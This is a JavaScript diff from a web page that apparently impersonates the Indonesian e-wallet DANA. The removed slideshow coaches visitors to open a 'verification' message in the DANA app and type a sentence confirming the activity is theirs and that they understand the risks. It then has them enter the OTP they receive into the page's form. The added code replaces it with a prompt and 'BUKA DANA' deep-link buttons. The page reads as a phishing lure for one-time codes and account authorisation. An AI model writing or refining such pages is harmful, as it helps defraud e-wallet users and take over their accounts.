@@ -468,247 +468,6 @@ resendBtn.addEventListener(
 
 });
 
-const slides = [
-{
-    badge:"Langkah 1",
-    title:'Buka Aplikasi <b>DANA</b><br>Klik menu <b>"Pesan"</b> di pojok kanan atas',
-    image:"cara/slide1.jpg"
-},
-{
-    badge:"Langkah 2",
-    title:'Buka <b>"Notifikasi Verifikasi"</b> paling atas yang baru diterima',
-    image:"cara/slide2.jpg"
-},
-{
-    badge:"Langkah 3",
-    title:'Klik tombol <b>"Verifikasi"</b> untuk melanjutkan proses',
-    image:"cara/slide3.jpg"
-},
-{
-    badge:"Langkah 4",
-    title:'Ketik<br><b>Ini benar aktivitas saya dan saya sadar serta paham risikonya.</b> <br> sebagai konfirmasi, kemudian klik Kirim',
-    image:"cara/slide4.jpg"
-},
-{
-    badge:"Langkah 5",
-    title:'Kode OTP dikirim via <b>"WhatsApp / SMS"</b>, isi ke form OTP untuk lanjut ke <b>Data Diri</b>',
-    image:"cara/slide5.jpg"
-},
-{
-badge:"Langkah 6",
-title:'Silakan lanjutkan proses di aplikasi <b>"DANA"</b>, lalu tekan tombol di bawah untuk membuka aplikasi DANA.',
-button:'Buka DANA',
-action:'bukaDana'
-}
-];
-
-function bukaDana() {
-window.location.href = "danaid://";
-}
-
-/* PRELOAD GAMBAR */
-
-slides.forEach(item => {
-
-    const img = new Image();
-
-    img.src = item.image;
-
-});
-
-let currentSlide = 0;
-let isAnimating = false;
-
-const stepBadge = document.getElementById("stepBadge");
-const stepTitle = document.getElementById("stepTitle");
-const slideImg = document.getElementById("slideImg");
-const slideCounter = document.getElementById("slideCounter");
-
-const prevBtn = document.getElementById("prevBtn");
-const nextBtn = document.getElementById("nextBtn");
-
-const dots = document.querySelectorAll(".dot");
-
-function renderSlide(direction = "next") {
-
-    if (isAnimating) return;
-
-    isAnimating = true;
-
-    const slide = slides[currentSlide];
-
-    const imageCard =
-        document.getElementById("imageCard");
-
-    const slideAction =
-        document.getElementById("slideAction");
-
-    slideImg.style.opacity = "0";
-
-    setTimeout(() => {
-
-        /* ========================= */
-        /* TEXT */
-        /* ========================= */
-
-        stepBadge.textContent =
-            slide.badge;
-
-        stepTitle.innerHTML =
-            slide.title;
-
-
-        /* ========================= */
-        /* HAPUS TOMBOL LAMA */
-        /* ========================= */
-
-        slideAction.innerHTML = "";
-
-
-        /* ========================= */
-        /* ADA GAMBAR */
-        /* ========================= */
-
-        if (slide.image) {
-
-            imageCard.style.display = "block";
-
-            slideImg.src =
-                slide.image;
-
-            slideImg.style.display =
-                "block";
-
-        }
-
-        /* ========================= */
-        /* TANPA GAMBAR */
-        /* ========================= */
-
-        else {
-
-            imageCard.style.display =
-                "none";
-
-            slideImg.removeAttribute("src");
-
-        }
-
-
-        /* ========================= */
-        /* TOMBOL */
-        /* ========================= */
-
-        if (slide.action === "bukaDana") {
-
-            const button =
-                document.createElement("button");
-
-            button.type = "button";
-
-            button.className =
-                "dana-open-btn";
-
-            button.textContent =
-                slide.button || "Buka DANA";
-
-            button.addEventListener(
-                "click",
-                bukaDana
-            );
-
-            slideAction.appendChild(
-                button
-            );
-
-        }
-
-
-        /* ========================= */
-        /* COUNTER */
-        /* ========================= */
-
-        slideCounter.textContent =
-            `${currentSlide + 1} / ${slides.length}`;
-
-
-        /* ========================= */
-        /* DOT */
-        /* ========================= */
-
-        dots.forEach((dot, index) => {
-
-            dot.classList.toggle(
-                "active",
-                index === currentSlide
-            );
-
-        });
-
-
-        /* ========================= */
-        /* ANIMATION */
-        /* ========================= */
-
-        if (slide.image) {
-
-            slideImg.style.transition =
-                "none";
-
-            slideImg.style.transform =
-                direction === "next"
-                ? "translateX(15px)"
-                : "translateX(-15px)";
-
-            requestAnimationFrame(() => {
-
-                slideImg.style.transition =
-                    "opacity .25s ease, transform .25s ease";
-
-                slideImg.style.opacity = "1";
-
-                slideImg.style.transform =
-                    "translateX(0)";
-
-            });
-
-        }
-
-        isAnimating = false;
-
-    }, 120);
-}
-
-nextBtn.addEventListener("click",()=>{
-
-    currentSlide++;
-
-    if(currentSlide>=slides.length){
-
-        currentSlide=0;
-
-    }
-
-    renderSlide("next");
-
-});
-
-prevBtn.addEventListener("click",()=>{
-
-    currentSlide--;
-
-    if(currentSlide<0){
-
-        currentSlide=slides.length-1;
-
-    }
-
-    renderSlide("prev");
-
-});
-
-renderSlide();
-
 const introOverlay =
 document.getElementById("introOverlay");
 
@@ -746,7 +505,7 @@ introBtn.addEventListener("click", () => {
 
 notifOkBtn.addEventListener("click", () => {
 
-    if(notifStep === 1){
+    if (notifStep === 1) {
 
         topNotif.classList.remove("show");
         topNotif.classList.add("hide");
@@ -754,10 +513,51 @@ notifOkBtn.addEventListener("click", () => {
         setTimeout(() => {
 
             document.querySelector(".top-notif-title").innerText =
-            "Belum menerima kode OTP?";
+                "Belum menerima Kode OTP?";
 
             document.querySelector(".top-notif-desc").innerHTML =
-            "Pastikan kamu sudah melakukan Verifikasi Partner.<br> Cara Verifikasi Partner ada di bawah.";
+                "Pastikan kamu sudah melakukan verifikasi.<br>" +
+                "Atau lanjutkan secara manual dengan klik BUKA DANA.";
+
+            /* ========================= */
+            /* WRAPPER TOMBOL */
+            /* ========================= */
+
+            const actions =
+                document.createElement("div");
+
+            actions.className = "notif-actions";
+
+            /* ========================= */
+            /* TOMBOL BUKA */
+            /* ========================= */
+
+            const bukaBtn =
+                document.createElement("button");
+
+            bukaBtn.id = "openAppNotifBtn";
+            bukaBtn.className = "notif-open-app-btn";
+            bukaBtn.textContent = "BUKA DANA";
+
+            bukaBtn.addEventListener("click", () => {
+                window.location.href = "myapp://";
+            });
+
+            /* ========================= */
+            /* PINDAHKAN KEDUA TOMBOL */
+            /* ========================= */
+
+            notifOkBtn.parentNode.insertBefore(
+                actions,
+                notifOkBtn
+            );
+
+            actions.appendChild(bukaBtn);
+            actions.appendChild(notifOkBtn);
+
+            /* ========================= */
+            /* TAMPILKAN */
+            /* ========================= */
 
             topNotif.classList.remove("hide");
             topNotif.classList.add("show");
@@ -767,15 +567,22 @@ notifOkBtn.addEventListener("click", () => {
 
             notifStep = 2;
 
-        },350);
+        }, 350);
 
-    }else{
+    } else {
 
         topNotif.classList.remove("show");
         topNotif.classList.add("hide");
 
     }
 
+});
+
+const openDanaBtn =
+    document.getElementById("openDanaBtn");
+
+openDanaBtn.addEventListener("click", () => {
+    window.location.href = "danaid://";
 });
 
 /* ========================= */
